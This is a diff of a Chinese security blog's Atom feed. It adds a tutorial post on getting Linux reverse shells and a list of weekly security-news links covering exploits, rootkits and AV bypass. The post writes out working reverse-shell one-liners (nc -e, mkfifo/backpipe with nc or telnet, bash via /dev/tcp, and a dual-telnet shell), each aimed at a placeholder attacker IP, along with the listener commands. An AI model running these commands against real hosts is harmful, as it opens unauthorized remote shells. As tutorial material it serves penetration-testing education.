@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2018-01-29T05:16:16.439Z</updated>
+  <updated>2018-01-30T08:51:21.505Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -16,11 +16,62 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>reverse shell的几种方式</title>
+    <link href="http://kevien.github.io/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
+    <id>http://kevien.github.io/2018/01/30/reverse-shell的几种方式/</id>
+    <published>2018-01-30T07:58:01.000Z</published>
+    <updated>2018-01-30T08:51:21.505Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。</li>
+<li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
+<li>下文中的几个例子一般在大多数的系统中是通用的。</li>
+<li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
+<li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
+<li><p>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）</p>
+<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
+</li>
+<li><p>现在的netcat版本可能没有-e参数。</p>
+<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
+<li>那么可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
+<h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
+<ul>
+<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
+<ul>
+<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
+<ul>
+<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-还有什么其它的方法？"><a href="#6-还有什么其它的方法？" class="headerlink" title="6.还有什么其它的方法？"></a>6.还有什么其它的方法？</h2><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
+<li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。&lt;/li&gt;
+&lt;li&gt;linux(GNUx
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>20180129安全动态</title>
     <link href="http://kevien.github.io/2018/01/29/20180129%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
     <id>http://kevien.github.io/2018/01/29/20180129安全动态/</id>
     <published>2018-01-29T04:52:57.000Z</published>
-    <updated>2018-01-29T05:16:16.439Z</updated>
+    <updated>2018-01-30T07:48:35.000Z</updated>
     
     <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
 <li>Linux boot process 分析<br><a href="https://opensource.com/article/18/1/analyzing-linux-boot-process" target="_blank" rel="external">https://opensource.com/article/18/1/analyzing-linux-boot-process</a></li>
@@ -28,6 +79,11 @@
 <li>dnscrypt-proxy - 一款 DNS 代理，支持加密的 DNS 协议<br><a href="https://github.com/jedisct1/dnscrypt-proxy" target="_blank" rel="external">https://github.com/jedisct1/dnscrypt-proxy</a></li>
 <li>命令行下的“蒙面歌王”rundll32.exe<br><a href="http://www.freebuf.com/sectool/160696.html" target="_blank" rel="external">http://www.freebuf.com/sectool/160696.html</a></li>
 <li>如何做好首席安全官 – 企业安全体系与架构实现<br><a href="https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/</a></li>
+<li>Cisco ASA 实验环境的搭建，来自 NCC Group<br><a href="https://github.com/nccgroup/asatools/blob/master/tutorial.md" target="_blank" rel="external">https://github.com/nccgroup/asatools/blob/master/tutorial.md</a></li>
+<li>IoT ARM 漏洞利用开发介绍<br><a href="https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf</a></li>
+<li>wavecrack - 调用 Hashcat 进行密码破解的 Web 操作接口<br><a href="https://github.com/wavestone-cdt/wavecrack" target="_blank" rel="external">https://github.com/wavestone-cdt/wavecrack</a></li>
+<li>Metasploit 框架新集成了 MS17-010 EternalSynergy Exploits，该 Exploits 支持 Windows 2000 到 Windows Server 2016 的所有版本，非常稳定<br><a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/9473</a></li>
+<li>DCShadow - Active Directory 域控环境中的最新攻击方法<br><a href="https://blog.alsid.eu/dcshadow-explained-4510f52fc19d" target="_blank" rel="external">https://blog.alsid.eu/dcshadow-explained-4510f52fc19d</a></li>
 </ul>
 ]]></content>
     
@@ -659,7 +715,7 @@
     <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
 <li>rootkit - 针对 Ubuntu 16.04 和 10.04 的 rootkit<br><a href="https://github.com/nurupo/rootkit" target="_blank" rel="external">https://github.com/nurupo/rootkit</a></li>
 <li>从 PE 文件结构角度出发，如何手动植入后门<br><a href="http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html" target="_blank" rel="external">http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html</a></li>
-<li>osquery 是 Facebook 开源的一款基于 SQL 的操作系统检测和监控框架。前两天推送过一篇《各个团队都是如何使用 osquery 的》。今天 Palantir 团队这篇 Blog 介绍如何部署和配置 osquery 框架<br><a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#x68;&#116;&#116;&#112;&#115;&#x3a;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#47;&#64;&#x70;&#x61;&#x6c;&#x61;&#x6e;&#116;&#105;&#114;&#x2f;&#x6f;&#x73;&#x71;&#x75;&#101;&#114;&#121;&#45;&#97;&#99;&#x72;&#111;&#115;&#x73;&#45;&#116;&#x68;&#101;&#x2d;&#x65;&#x6e;&#x74;&#x65;&#114;&#112;&#114;&#x69;&#x73;&#x65;&#x2d;&#51;&#99;&#51;&#x63;&#57;&#x64;&#x31;&#x33;&#101;&#99;&#x35;&#53;">&#x68;&#116;&#116;&#112;&#115;&#x3a;&#47;&#x2f;&#109;&#101;&#x64;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#47;&#64;&#x70;&#x61;&#x6c;&#x61;&#x6e;&#116;&#105;&#114;&#x2f;&#x6f;&#x73;&#x71;&#x75;&#101;&#114;&#121;&#45;&#97;&#99;&#x72;&#111;&#115;&#x73;&#45;&#116;&#x68;&#101;&#x2d;&#x65;&#x6e;&#x74;&#x65;&#114;&#112;&#114;&#x69;&#x73;&#x65;&#x2d;&#51;&#99;&#51;&#x63;&#57;&#x64;&#x31;&#x33;&#101;&#99;&#x35;&#53;</a></li>
+<li>osquery 是 Facebook 开源的一款基于 SQL 的操作系统检测和监控框架。前两天推送过一篇《各个团队都是如何使用 osquery 的》。今天 Palantir 团队这篇 Blog 介绍如何部署和配置 osquery 框架<br><a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#104;&#x74;&#116;&#x70;&#115;&#x3a;&#47;&#x2f;&#x6d;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#x63;&#111;&#x6d;&#x2f;&#x40;&#x70;&#x61;&#x6c;&#97;&#x6e;&#x74;&#x69;&#x72;&#x2f;&#x6f;&#x73;&#113;&#117;&#x65;&#x72;&#x79;&#x2d;&#97;&#99;&#x72;&#111;&#x73;&#x73;&#45;&#x74;&#104;&#101;&#45;&#x65;&#x6e;&#116;&#101;&#x72;&#112;&#114;&#105;&#x73;&#101;&#x2d;&#51;&#99;&#51;&#x63;&#x39;&#100;&#x31;&#51;&#x65;&#x63;&#53;&#x35;">&#104;&#x74;&#116;&#x70;&#115;&#x3a;&#47;&#x2f;&#x6d;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#x63;&#111;&#x6d;&#x2f;&#x40;&#x70;&#x61;&#x6c;&#97;&#x6e;&#x74;&#x69;&#x72;&#x2f;&#x6f;&#x73;&#113;&#117;&#x65;&#x72;&#x79;&#x2d;&#97;&#99;&#x72;&#111;&#x73;&#x73;&#45;&#x74;&#104;&#101;&#45;&#x65;&#x6e;&#116;&#101;&#x72;&#112;&#114;&#105;&#x73;&#101;&#x2d;&#51;&#99;&#51;&#x63;&#x39;&#100;&#x31;&#51;&#x65;&#x63;&#53;&#x35;</a></li>
 <li>使用 Windows Defender ATP 检查反射型 DLL 加载<br><a href="https://blogs.technet.microsoft.com/mmpc/2017/11/13/detecting-reflective-dll-loading-with-windows-defender-atp/?ocid=cx-twitter-mmpc" target="_blank" rel="external">https://blogs.technet.microsoft.com/mmpc/2017/11/13/detecting-reflective-dll-loading-with-windows-defender-atp/?ocid=cx-twitter-mmpc</a></li>
 <li>Windows 系统中的安全软件的 Bypass 策略。从特征检测、行为检测、信誉评估检测三个方向讨论对应的 Bypass 方法<br><a href="https://artofpwn.com/spookflare.html" target="_blank" rel="external">https://artofpwn.com/spookflare.html</a></li>
 <li>PowerKrabsEtw - 用于实时 ETW(事件日志) Trace 的 PowerShell 模块，基于微软的 krabsetw 库实现<br><a href="https://github.com/zacbrown/PowerKrabsEtw" target="_blank" rel="external">https://github.com/zacbrown/PowerKrabsEtw</a></li>
@@ -729,7 +785,7 @@
 <li>当第三方组件变成邪恶之源<br><a href="https://1drv.ms/p/s!Al6ImNZd5mQmeK39RoVxiJ5re8Y" target="_blank" rel="external">https://1drv.ms/p/s!Al6ImNZd5mQmeK39RoVxiJ5re8Y</a></li>
 <li>glibc malloc学习笔记之fastbin<br><a href="https://paper.seebug.org/445/" target="_blank" rel="external">https://paper.seebug.org/445/</a></li>
 <li>Hyper-V安全从0到1<br><a href="https://bbs.pediy.com/thread-222626.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-222626.htm</a></li>
-<li><p>Drexel One API逆向工程<br><a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#58;&#104;&#116;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#x69;&#117;&#x6d;&#46;&#x63;&#111;&#x6d;&#47;&#x40;&#116;&#111;&#x6d;&#x65;&#x72;&#115;&#104;&#101;&#109;&#101;&#115;&#x68;&#47;&#114;&#x65;&#x76;&#101;&#114;&#115;&#x65;&#x2d;&#x65;&#110;&#103;&#105;&#110;&#101;&#101;&#x72;&#105;&#x6e;&#x67;&#x2d;&#x74;&#104;&#x65;&#45;&#100;&#x72;&#x65;&#120;&#x65;&#x6c;&#x2d;&#111;&#110;&#x65;&#x2d;&#97;&#x70;&#x69;&#45;&#51;&#x37;&#48;&#x61;&#x35;&#x36;&#48;&#x61;&#x66;&#x65;&#x64;&#102;">&#104;&#116;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#109;&#101;&#x64;&#x69;&#117;&#x6d;&#46;&#x63;&#111;&#x6d;&#47;&#x40;&#116;&#111;&#x6d;&#x65;&#x72;&#115;&#104;&#101;&#109;&#101;&#115;&#x68;&#47;&#114;&#x65;&#x76;&#101;&#114;&#115;&#x65;&#x2d;&#x65;&#110;&#103;&#105;&#110;&#101;&#101;&#x72;&#105;&#x6e;&#x67;&#x2d;&#x74;&#104;&#x65;&#45;&#100;&#x72;&#x65;&#120;&#x65;&#x6c;&#x2d;&#111;&#110;&#x65;&#x2d;&#97;&#x70;&#x69;&#45;&#51;&#x37;&#48;&#x61;&#x35;&#x36;&#48;&#x61;&#x66;&#x65;&#x64;&#102;</a></p>
+<li><p>Drexel One API逆向工程<br><a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x68;&#116;&#116;&#112;&#x73;&#58;&#x2f;&#47;&#109;&#101;&#100;&#105;&#117;&#x6d;&#x2e;&#99;&#x6f;&#109;&#x2f;&#x40;&#x74;&#x6f;&#109;&#101;&#114;&#x73;&#x68;&#101;&#x6d;&#x65;&#x73;&#x68;&#x2f;&#114;&#101;&#x76;&#x65;&#114;&#115;&#x65;&#45;&#x65;&#110;&#103;&#105;&#x6e;&#101;&#x65;&#x72;&#x69;&#110;&#103;&#45;&#x74;&#x68;&#x65;&#45;&#100;&#x72;&#101;&#x78;&#101;&#108;&#x2d;&#111;&#110;&#x65;&#45;&#x61;&#x70;&#105;&#45;&#51;&#x37;&#48;&#97;&#x35;&#x36;&#x30;&#97;&#x66;&#x65;&#x64;&#x66;">&#x68;&#116;&#116;&#112;&#x73;&#58;&#x2f;&#47;&#109;&#101;&#100;&#105;&#117;&#x6d;&#x2e;&#99;&#x6f;&#109;&#x2f;&#x40;&#x74;&#x6f;&#109;&#101;&#114;&#x73;&#x68;&#101;&#x6d;&#x65;&#x73;&#x68;&#x2f;&#114;&#101;&#x76;&#x65;&#114;&#115;&#x65;&#45;&#x65;&#110;&#103;&#105;&#x6e;&#101;&#x65;&#x72;&#x69;&#110;&#103;&#45;&#x74;&#x68;&#x65;&#45;&#100;&#x72;&#101;&#x78;&#101;&#108;&#x2d;&#111;&#110;&#x65;&#45;&#x61;&#x70;&#105;&#45;&#51;&#x37;&#48;&#97;&#x35;&#x36;&#x30;&#97;&#x66;&#x65;&#x64;&#x66;</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mac上的逆向</div></pre></td></tr></table></figure>
 </li>
 <li><p>信息安全Cheat Sheets<br><a href="https://www.cybrary.it/0p3n/infosec-cheat-sheets/" target="_blank" rel="external">https://www.cybrary.it/0p3n/infosec-cheat-sheets/</a></p>
@@ -737,7 +793,7 @@
 <li>新近出现的提权框架<br><a href="https://github.com/spencerdodd/kernelpop" target="_blank" rel="external">https://github.com/spencerdodd/kernelpop</a></li>
 <li>Windows利用开发四：SEH覆写<br><a href="http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html" target="_blank" rel="external">http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html</a></li>
 <li>DCOM与DDE的奇妙结合<br><a href="https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom" target="_blank" rel="external">https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom</a></li>
-<li>二进制代码的模糊测试<br><a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#104;&#x74;&#116;&#112;&#x73;&#58;&#47;&#x2f;&#x6d;&#101;&#100;&#x69;&#x75;&#x6d;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#x40;&#x6e;&#106;&#118;&#x6f;&#x73;&#x73;&#x32;&#x39;&#x39;&#47;&#97;&#102;&#108;&#45;&#117;&#110;&#x69;&#x63;&#111;&#114;&#x6e;&#45;&#102;&#117;&#x7a;&#x7a;&#x69;&#x6e;&#x67;&#x2d;&#x61;&#x72;&#x62;&#105;&#116;&#114;&#x61;&#114;&#x79;&#x2d;&#98;&#105;&#x6e;&#x61;&#114;&#x79;&#x2d;&#99;&#111;&#100;&#101;&#x2d;&#x35;&#x36;&#x33;&#99;&#97;&#50;&#56;&#57;&#51;&#x36;&#98;&#102;">&#104;&#x74;&#116;&#112;&#x73;&#58;&#47;&#x2f;&#x6d;&#101;&#100;&#x69;&#x75;&#x6d;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#x40;&#x6e;&#106;&#118;&#x6f;&#x73;&#x73;&#x32;&#x39;&#x39;&#47;&#97;&#102;&#108;&#45;&#117;&#110;&#x69;&#x63;&#111;&#114;&#x6e;&#45;&#102;&#117;&#x7a;&#x7a;&#x69;&#x6e;&#x67;&#x2d;&#x61;&#x72;&#x62;&#105;&#116;&#114;&#x61;&#114;&#x79;&#x2d;&#98;&#105;&#x6e;&#x61;&#114;&#x79;&#x2d;&#99;&#111;&#100;&#101;&#x2d;&#x35;&#x36;&#x33;&#99;&#97;&#50;&#56;&#57;&#51;&#x36;&#98;&#102;</a></li>
+<li>二进制代码的模糊测试<br><a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x68;&#x74;&#x74;&#112;&#x73;&#58;&#x2f;&#x2f;&#x6d;&#101;&#100;&#105;&#x75;&#x6d;&#46;&#x63;&#111;&#109;&#x2f;&#64;&#x6e;&#106;&#x76;&#111;&#115;&#115;&#x32;&#x39;&#x39;&#47;&#x61;&#x66;&#108;&#45;&#117;&#110;&#x69;&#x63;&#111;&#x72;&#x6e;&#x2d;&#x66;&#117;&#122;&#122;&#105;&#x6e;&#103;&#x2d;&#97;&#114;&#x62;&#105;&#116;&#114;&#97;&#114;&#121;&#x2d;&#98;&#x69;&#x6e;&#x61;&#114;&#x79;&#45;&#x63;&#x6f;&#100;&#101;&#45;&#x35;&#x36;&#51;&#x63;&#97;&#50;&#x38;&#57;&#x33;&#54;&#98;&#x66;">&#x68;&#x74;&#x74;&#112;&#x73;&#58;&#x2f;&#x2f;&#x6d;&#101;&#100;&#105;&#x75;&#x6d;&#46;&#x63;&#111;&#109;&#x2f;&#64;&#x6e;&#106;&#x76;&#111;&#115;&#115;&#x32;&#x39;&#x39;&#47;&#x61;&#x66;&#108;&#45;&#117;&#110;&#x69;&#x63;&#111;&#x72;&#x6e;&#x2d;&#x66;&#117;&#122;&#122;&#105;&#x6e;&#103;&#x2d;&#97;&#114;&#x62;&#105;&#116;&#114;&#97;&#114;&#121;&#x2d;&#98;&#x69;&#x6e;&#x61;&#114;&#x79;&#45;&#x63;&#x6f;&#100;&#101;&#45;&#x35;&#x36;&#51;&#x63;&#97;&#50;&#x38;&#57;&#x33;&#54;&#98;&#x66;</a></li>
 </ul>
 ]]></content>
     
@@ -777,7 +833,7 @@
 <li>hack with github 编选的 10 月份 Top 5 安全工具<br><a href="https://medium.com/hack-with-github/top-5-security-tools-october-2017-76ab31834efd" target="_blank" rel="external">https://medium.com/hack-with-github/top-5-security-tools-october-2017-76ab31834efd</a></li>
 <li>把一个恶意样本 PE 文件头部的 “This program cannot be run in DOS mode” 中的 “This” 改为 “That”，可以 Bypass 11 款杀软<br><a href="https://twitter.com/zerosum0x0/status/925486850399019009/photo/1" target="_blank" rel="external">https://twitter.com/zerosum0x0/status/925486850399019009/photo/1</a></li>
 <li>揭秘：两张A4纸破解虹膜、人脸识别，百度安全技术小哥怎么做到的？<br><a href="https://mp.weixin.qq.com/s/zq7D8YzjljJ8rsteib1ljA" target="_blank" rel="external">https://mp.weixin.qq.com/s/zq7D8YzjljJ8rsteib1ljA</a></li>
-<li>Google Bug Tracker 存在漏洞可越权查看未修复漏洞的报告<br><a href="https://threatpost.com/flaw-in-google-bug-tracker-exposed-reports-about-unpatched-vulnerabilities/128687" target="_blank" rel="external">https://threatpost.com/flaw-in-google-bug-tracker-exposed-reports-about-unpatched-vulnerabilities/128687</a><br><a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x68;&#116;&#x74;&#x70;&#115;&#x3a;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#99;&#x6f;&#109;&#x2f;&#x40;&#x61;&#108;&#x65;&#120;&#46;&#98;&#105;&#x72;&#x73;&#97;&#110;&#x2f;&#x6d;&#x65;&#115;&#115;&#x69;&#110;&#x67;&#45;&#x77;&#x69;&#116;&#x68;&#45;&#x74;&#x68;&#x65;&#45;&#x67;&#x6f;&#111;&#103;&#108;&#x65;&#45;&#x62;&#117;&#x67;&#x61;&#x6e;&#105;&#122;&#101;&#x72;&#45;&#115;&#121;&#x73;&#116;&#x65;&#109;&#x2d;&#x66;&#x6f;&#x72;&#45;&#x31;&#53;&#x2d;&#x36;&#x30;&#48;&#x2d;&#x69;&#110;&#45;&#x62;&#x6f;&#x75;&#110;&#x74;&#105;&#x65;&#x73;&#x2d;&#53;&#x38;&#102;&#56;&#x36;&#99;&#x63;&#57;&#102;&#x39;&#x61;&#x35;">&#x68;&#116;&#x74;&#x70;&#115;&#x3a;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#99;&#x6f;&#109;&#x2f;&#x40;&#x61;&#108;&#x65;&#120;&#46;&#98;&#105;&#x72;&#x73;&#97;&#110;&#x2f;&#x6d;&#x65;&#115;&#115;&#x69;&#110;&#x67;&#45;&#x77;&#x69;&#116;&#x68;&#45;&#x74;&#x68;&#x65;&#45;&#x67;&#x6f;&#111;&#103;&#108;&#x65;&#45;&#x62;&#117;&#x67;&#x61;&#x6e;&#105;&#122;&#101;&#x72;&#45;&#115;&#121;&#x73;&#116;&#x65;&#109;&#x2d;&#x66;&#x6f;&#x72;&#45;&#x31;&#53;&#x2d;&#x36;&#x30;&#48;&#x2d;&#x69;&#110;&#45;&#x62;&#x6f;&#x75;&#110;&#x74;&#105;&#x65;&#x73;&#x2d;&#53;&#x38;&#102;&#56;&#x36;&#99;&#x63;&#57;&#102;&#x39;&#x61;&#x35;</a></li>
+<li>Google Bug Tracker 存在漏洞可越权查看未修复漏洞的报告<br><a href="https://threatpost.com/flaw-in-google-bug-tracker-exposed-reports-about-unpatched-vulnerabilities/128687" target="_blank" rel="external">https://threatpost.com/flaw-in-google-bug-tracker-exposed-reports-about-unpatched-vulnerabilities/128687</a><br><a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#104;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#109;&#x65;&#x64;&#105;&#117;&#109;&#46;&#x63;&#x6f;&#109;&#47;&#64;&#x61;&#x6c;&#101;&#120;&#x2e;&#x62;&#x69;&#114;&#115;&#97;&#110;&#x2f;&#x6d;&#101;&#115;&#x73;&#105;&#x6e;&#103;&#45;&#119;&#x69;&#x74;&#104;&#45;&#116;&#104;&#x65;&#45;&#103;&#111;&#111;&#x67;&#x6c;&#x65;&#x2d;&#98;&#x75;&#x67;&#x61;&#110;&#x69;&#x7a;&#101;&#x72;&#x2d;&#115;&#x79;&#115;&#x74;&#101;&#x6d;&#x2d;&#x66;&#x6f;&#114;&#45;&#x31;&#53;&#45;&#x36;&#x30;&#48;&#45;&#x69;&#x6e;&#x2d;&#98;&#x6f;&#x75;&#x6e;&#x74;&#105;&#x65;&#x73;&#45;&#x35;&#x38;&#102;&#56;&#x36;&#99;&#x63;&#57;&#x66;&#57;&#x61;&#53;">&#104;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#109;&#x65;&#x64;&#105;&#117;&#109;&#46;&#x63;&#x6f;&#109;&#47;&#64;&#x61;&#x6c;&#101;&#120;&#x2e;&#x62;&#x69;&#114;&#115;&#97;&#110;&#x2f;&#x6d;&#101;&#115;&#x73;&#105;&#x6e;&#103;&#45;&#119;&#x69;&#x74;&#104;&#45;&#116;&#104;&#x65;&#45;&#103;&#111;&#111;&#x67;&#x6c;&#x65;&#x2d;&#98;&#x75;&#x67;&#x61;&#110;&#x69;&#x7a;&#101;&#x72;&#x2d;&#115;&#x79;&#115;&#x74;&#101;&#x6d;&#x2d;&#x66;&#x6f;&#114;&#45;&#x31;&#53;&#45;&#x36;&#x30;&#48;&#45;&#x69;&#x6e;&#x2d;&#98;&#x6f;&#x75;&#x6e;&#x74;&#105;&#x65;&#x73;&#45;&#x35;&#x38;&#102;&#56;&#x36;&#99;&#x63;&#57;&#x66;&#57;&#x61;&#53;</a></li>
 <li>Office-DDE-Payloads - 生成嵌入 DDE 的 恶意 Office 文档的脚本<br><a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" target="_blank" rel="external">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a></li>
 <li>Ironsquirrel - 以加密的方式将浏览器漏洞利用代码发往受害者浏览器的工具<br><a href="https://github.com/MRGEffitas/Ironsquirrel" target="_blank" rel="external">https://github.com/MRGEffitas/Ironsquirrel</a></li>
 <li>LIEF - 之前推送过这个工具，QuarksLab 开源的一个跨平台可执行文件格式（PE/ELF/MachO）的解析、修改、抽象库，QuarksLab 昨天更新了一篇介绍 LIEF 库用法的 Blog<br><a href="https://blog.quarkslab.com/have-fun-with-lief-and-executable-formats.html" target="_blank" rel="external">https://blog.quarkslab.com/have-fun-with-lief-and-executable-formats.html</a></li>
@@ -844,25 +900,6 @@
     
       &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;黑客适用的贝叶斯数学&lt;br&gt;&lt;a href=&quot;https://camdavidsonpilon.github.i
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>堆溢出利用笔记</title>
-    <link href="http://kevien.github.io/2017/10/28/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
-    <id>http://kevien.github.io/2017/10/28/堆溢出利用笔记/</id>
-    <published>2017-10-28T03:18:28.000Z</published>
-    <updated>2017-11-20T09:11:33.468Z</updated>
-    
